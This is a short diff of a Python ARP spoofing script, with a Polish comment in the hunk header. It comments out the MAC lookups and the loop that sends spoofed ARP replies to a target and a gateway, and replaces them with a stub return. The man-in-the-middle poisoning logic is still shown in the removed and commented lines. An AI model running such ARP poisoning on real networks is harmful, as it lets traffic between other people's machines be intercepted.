@@ -20,16 +20,17 @@ def sendspoofedreply(targetip, targetmac, sourceip): # wysyłamy odpowiedzi ze z
     send(spoofed, verbose=False)
 
 def main_function():
-    targetMAC = getMACAddress(targetip)
+    # targetMAC = getMACAddress(targetip)
 
-    gatewayMAC = getMACAddress(gatewayip)
+    # gatewayMAC = getMACAddress(gatewayip)
 
 
-    # spoofing
-    try:
-        for i in range(100):
-            sendspoofedreply(targetip, targetMAC, gatewayip)
-            sendspoofedreply(gatewayip, gatewayMAC, targetip)
-    except KeyboardInterrupt:
-        print('Stop spoofing')
-    return 'Spoofing done-> \nTarget MAC: ', targetMAC, ' \n Gateway MAC: ', gatewayMAC
+    # # spoofing
+    # try:
+    #     for i in range(100):
+    #         sendspoofedreply(targetip, targetMAC, gatewayip)
+    #         sendspoofedreply(gatewayip, gatewayMAC, targetip)
+    # except KeyboardInterrupt:
+    #     print('Stop spoofing')
+    # return 'Spoofing done-> \nTarget MAC: ', targetMAC, ' \n Gateway MAC: ', gatewayMAC
+    return "Spoofing finished"
